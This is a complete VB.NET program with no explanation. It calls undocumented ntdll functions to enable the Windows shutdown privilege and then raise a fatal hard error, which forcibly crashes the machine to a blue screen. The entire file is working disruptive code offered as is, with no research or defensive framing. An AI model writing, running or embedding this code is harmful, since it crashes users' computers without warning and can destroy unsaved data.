Imports System.Runtime.InteropServices

Module M
    Private Const i = &HC0000022  ''error code

    Public Declare Function RtlAdjustPrivilege Lib "ntdll.dll" Alias "RtlAdjustPrivilege" (ByVal Privilege As Integer, ByVal bEnablePrivilege As Boolean, ByVal IsThreadPrivilege As Boolean, <Out> ByRef PreviousValue As Boolean) As UInteger
    Public Declare Function NtRaiseHardError Lib "ntdll.dll" Alias "NtRaiseHardError" (ByVal ErrorStatus As Integer, ByVal NumberOfParameters As UInteger, ByVal UnicodeStringParameterMask As UInteger, ByVal Parameters As IntPtr, ByVal ValidResponseOption As UInteger, <Out> ByRef Response As UInteger) As UInteger

    Sub Main()
        Dim t1 As Boolean
        Dim t2 As UInteger
        RtlAdjustPrivilege(19, True, False, t1)
        NtRaiseHardError(i, 0, 0, IntPtr.Zero, 6, t2)
    End Sub
End Module
